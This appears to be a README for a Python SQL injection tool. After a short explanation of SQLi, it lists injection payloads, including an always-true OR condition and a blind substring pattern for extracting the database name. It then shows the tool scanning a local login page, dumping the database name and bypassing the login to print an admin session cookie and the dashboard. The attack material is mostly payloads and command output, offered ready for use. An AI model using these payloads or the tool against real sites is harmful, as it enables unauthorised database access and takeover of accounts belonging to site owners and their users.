# What is SQL injection (SQLi)?
SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack. <a href="https://github.com/payloadbox/sql-injection-payload-list">Learn more</a>.

**Payloads**
```
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
' OR 1 = 1 -- 
' OR BINARY substring(database(), %d, 1) = '%s' -- 
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
```

**Example**
- Scan Vulnerability Sql Injection
```
python3 main.py -s http://localhost/hacking/login.php
[!] Trying http://localhost/hacking/login.php"
[!] Trying http://localhost/hacking/login.php'
[+] Detected 1 forms on http://localhost/hacking/login.php.
```
- Hack Database With Sql Injection
```
python3 main.py -d http://localhost/hacking/login.php
hacking
```
- Bypass Login Website With Sql Injection
```
python3 main.py -f http://localhost/hacking/login.php
--------------------------------------------------
[+] Login success!
[+] Admin cookie: mkffq2vgo24is4jr782cuc6g2n

<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Dashboard</title>
    </head>
<body>
   <h1>Hallo admin!</h1>
        <p>Data 1 : This is coffee</p>
    <p>Data 2 : This is tea</p>
    <p>Data 3 : This is orange</p>
         <a href="logout.php">Logout</a>
</body>
</html>
```

# Libraries
- <a href="https://pypi.org/project/bs4/">Beautiful Soup</a>
- <a href="https://pypi.org/project/requests/">Requests</a>
